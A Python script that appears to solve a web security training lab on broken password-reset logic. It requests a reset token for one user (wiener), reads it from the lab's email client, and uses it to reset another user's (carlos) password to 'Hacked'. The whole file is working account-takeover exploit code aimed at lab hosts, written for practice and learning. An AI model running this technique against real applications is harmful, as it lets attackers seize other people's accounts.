#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 26/8/2023
#
# Lab: Password reset broken logic
#
# Steps: 1. Send forgot-password request as wiener
#        2. Extract the token from the email client
#        3. Send change-password request as carlos
#
#################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ab9005003f90b0283f28f00005200ea.web-security-academy.net"

# change this to your email client URL
email_client = "https://exploit-0ae800e603a20b3a83988ed2015c006f.exploit-server.net/email"

try:  
    # make a forgot password request to wiener
    post_forgot_password = requests.post(f"{url}/forgot-password", data={"username": "wiener"})

except:
    print(Fore.RED + "Failed to send forgot password request through exception")
    exit(1)


print("1. Send forgot-password request as wiener.. OK")

try:  
    # fetch the exploit server page to extract the token from
    get_token = requests.get(email_client)

except:
    print(Fore.RED + "Failed to get the exploit server through exception")
    exit(1)

# search for token in the page
temp_token = re.findall("temp-forgot-password-token=(.*)'", get_token.text)[0]

# if token is found
if len(temp_token) != 0:  
    print("2. Extract the token from the email client.. OK")
    
    # set the new password
    # change this to what you want
    new_password = "Hacked"  

    # set data to send via POST
    data = {
        "temp-forgot-password-token": temp_token,
        "username": "carlos",
        "new-password-1": new_password,
        "new-password-2": new_password
    }

    try:  
        # change carlos password
        change_password = requests.post(f"{url}/forgot-password", data, allow_redirects=False)
        
    except:
        print(Fore.RED + "Change password request failed through exception")
        exit(1)

    print("3. Send change-password request as carlos.. OK")
    
    # if you changed carlos password successfully
    if change_password.status_code == 302:  
        print(Fore.GREEN + "Carlos's password is changed successfully to: " + new_password)
    
    else:
        print(Fore.RED + "Change password request failed")
    
else:
    print(Fore.RED + "No token found on the server")

